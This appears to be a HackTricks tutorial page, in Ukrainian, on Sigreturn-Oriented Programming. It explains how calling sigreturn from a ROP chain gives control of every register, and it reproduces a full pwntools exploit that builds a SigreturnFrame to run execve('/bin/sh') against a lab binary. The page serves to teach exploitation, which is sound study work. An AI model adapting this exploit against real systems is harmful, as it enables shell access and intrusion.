# SROP - Sigreturn-Oriented Programming

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

**`Sigreturn`** - це спеціальний **syscall**, який в основному використовується для очищення після завершення виконання обробника сигналів. Сигнали - це переривання, які надсилаються програмі операційною системою, часто для вказівки на те, що сталася якась виняткова ситуація. Коли програма отримує сигнал, вона тимчасово призупиняє свою поточну роботу, щоб обробити сигнал за допомогою **обробника сигналів**, спеціальної функції, призначеної для роботи з сигналами.

Після завершення обробника сигналів програма повинна **відновити свій попередній стан**, ніби нічого не сталося. Тут і вступає в гру **`sigreturn`**. Він допомагає програмі **повернутися з обробника сигналів** і відновлює стан програми, очищаючи стековий фрейм (сектор пам'яті, що зберігає виклики функцій і локальні змінні), який використовувався обробником сигналів.

Цікава частина полягає в тому, як **`sigreturn`** відновлює стан програми: він робить це, зберігаючи **всі значення регістрів ЦП на стеку.** Коли сигнал більше не заблокований, **`sigreturn` витягує ці значення зі стеку**, ефективно скидаючи регістри ЦП до їх стану до обробки сигналу. Це включає регістр вказівника стеку (RSP), який вказує на поточну верхню частину стеку.

> [!CAUTION]
> Виклик syscall **`sigreturn`** з ROP-ланцюга та **додавання значень регістрів**, які ми хочемо завантажити в **стек**, дозволяє **контролювати** всі значення регістрів і, отже, **викликати**, наприклад, syscall `execve` з `/bin/sh`.

Зверніть увагу, як це буде **типом Ret2syscall**, що значно полегшує контроль параметрів для виклику інших Ret2syscalls:

{{#ref}}
rop-syscall-execv.md
{{#endref}}

Для кращого пояснення також перегляньте:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Example

Ви можете [**знайти приклад тут**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop), хоча це фінальний експлойт звідти:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
## Посилання

- [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
- [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)

{{#include ../../../banners/hacktricks-training.md}}
